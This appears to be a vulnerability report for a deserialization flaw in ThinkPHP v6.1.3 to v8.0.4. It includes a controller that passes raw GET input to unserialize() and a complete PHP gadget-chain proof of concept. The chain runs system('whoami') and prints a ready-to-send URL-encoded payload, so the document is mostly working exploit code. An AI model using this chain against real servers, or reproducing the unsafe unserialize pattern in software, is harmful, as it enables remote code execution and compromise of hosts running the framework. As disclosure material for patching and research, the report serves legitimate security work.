

## Vulnerability description

A deserialization vulnerability in Thinkphp v6.1.3 to v8.0.4 allows attackers to execute arbitrary code.

## Affects Version



Thinkphp v6.1.3 to v8.0.4

## Vulnerability certificate

php8.0.2 thinkphp v8.0.0



First, add new deserialization endpoint in app\controller\Index.php, such as:

```php
<?php

namespace app\controller;

use app\BaseController;

class Index extends BaseController
{
    public function index()
    {
        unserialize($_GET['lll']);
        return '<style>*{ padding: 0; margin: 0; }</style><iframe src="https://www.thinkphp.cn/welcome?version=' . \think\facade\App::version() . '" width="100%" height="100%" frameborder="0" scrolling="auto"></iframe>';
    }

}
```



POC

```php
<?php

namespace think\model\concern;

trait Attribute
{
    private $data = ["key" => ["key1" => "whoami"]];
    private $withAttr = ["key"=>["key1"=>"system"]];
    protected $json = ["key"];
}
namespace think;

abstract class Model
{
    use model\concern\Attribute;
    private $lazySave;
    protected $withEvent;
    private $exists;
    private $force;
    protected $table;
    protected $jsonAssoc;
    function __construct($obj = '')
    {
        $this->lazySave = true;
        $this->withEvent = false;
        $this->exists = true;
        $this->force = true;
        $this->table = $obj;
        $this->jsonAssoc = true;
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}


namespace think\route;
use think\model\Pivot;
class ResourceRegister
{
    protected $registered = false;
    protected $resource;
    function __construct()
    {
        $this->registered=false;
        $this->resource=new Pivot(new Pivot());
    }
}


namespace think;
use think\route\ResourceRegister;
$r=new ResourceRegister();
echo urlencode(serialize($r));
```

Use the payload to deserialize can result to RCE:



![image-20240912092112199](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240912092112199.png)
